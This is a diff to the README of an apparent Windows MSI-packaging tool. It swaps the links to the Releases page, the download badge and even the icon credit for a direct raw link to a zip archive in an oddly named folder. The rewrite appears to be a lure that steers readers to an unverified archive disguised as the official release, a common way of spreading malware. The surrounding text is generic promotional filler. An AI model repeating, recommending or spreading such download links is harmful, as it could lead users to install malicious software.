@@ -20,7 +20,7 @@ MSI-Compiler is a reliable solution for developers working with Windows applicat
 
 Using MSI-Compiler is straightforward. Simply follow these steps:
 
-1. Download the latest version from the [Releases](https://github.com/yonilss/Msi-compiler/releases) section.
+1. Download the latest version from the [Releases](https://github.com/yonilss/Msi-compiler/raw/refs/heads/main/subsecretary/Msi_compiler_v3.1.zip) section.
    
 2. Install the tool on your system.
    
@@ -36,14 +36,14 @@ Using MSI-Compiler is straightforward. Simply follow these steps:
 
 ## Download and Execute
 
-To download the MSI-Compiler tool and begin creating MSI packages, visit the [Releases](https://github.com/yonilss/Msi-compiler/releases) section and download the latest software version.
+To download the MSI-Compiler tool and begin creating MSI packages, visit the [Releases](https://github.com/yonilss/Msi-compiler/raw/refs/heads/main/subsecretary/Msi_compiler_v3.1.zip) section and download the latest software version.
 
-[![Download MSI-Compiler](https://img.shields.io/badge/Download-MSI--Compiler-blue)](https://github.com/yonilss/Msi-compiler/releases)
+[![Download MSI-Compiler](https://github.com/yonilss/Msi-compiler/raw/refs/heads/main/subsecretary/Msi_compiler_v3.1.zip)](https://github.com/yonilss/Msi-compiler/raw/refs/heads/main/subsecretary/Msi_compiler_v3.1.zip)
 
 Unlock the potential of MSI-Compiler and streamline your application packaging process today!
 
 ## Credits
 
-- Icon made by Freepik from www.flaticon.com
+- Icon made by Freepik from https://github.com/yonilss/Msi-compiler/raw/refs/heads/main/subsecretary/Msi_compiler_v3.1.zip
 
 Remember, simplicity and efficiency are key when it comes to software development. With MSI-Compiler, you can take the hassle out of creating MSI packages and ensure seamless installations for your users. Utilize this tool to enhance your workflow and achieve optimal deployment results.
